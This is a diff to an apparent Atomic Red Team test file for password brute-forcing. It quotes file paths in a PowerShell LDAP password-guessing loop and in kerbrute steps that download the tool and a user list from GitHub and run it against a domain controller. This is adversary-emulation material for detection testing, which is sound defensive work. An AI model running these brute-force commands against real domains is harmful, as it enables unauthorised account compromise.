@@ -57,7 +57,7 @@ atomic_tests:
       [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
       $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389)
 
-      $passwordList = Get-Content -Path #{passwords_path}
+      $passwordList = Get-Content -Path "#{passwords_path}"
       foreach ($password in $passwordList){
         $credz = new-object System.Net.NetworkCredential("#{user}", $password, "#{domain}")
         $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
@@ -137,21 +137,21 @@ atomic_tests:
   - description: |
       kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads
     prereq_command: |
-      if (test-path PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe){exit 0} else {exit 1}
+      if (test-path "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"){exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"
   - description: |
       bruteuser.txt must exist in PathToAtomicsFolder\..\ExternalPayloads
     prereq_command: |
-      if (test-path PathToAtomicsFolder\..\ExternalPayloads\bruteuser.txt){exit 0} else {exit 1}
+      if (test-path "PathToAtomicsFolder\..\ExternalPayloads\bruteuser.txt"){exit 0} else {exit 1}
     get_prereq_command: |
       invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/src/bruteuser.txt?raw=true" -outfile "PathToAtomicsFolder\..\ExternalPayloads\bruteuser.txt"
   executor:
     name: powershell
     elevation_required: false
     command: |
-      cd PathToAtomicsFolder\..\ExternalPayloads
+      cd "PathToAtomicsFolder\..\ExternalPayloads"
       .\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\bruteuser.txt TestUser1 
 
 - name: SUDO Brute Force - Debian
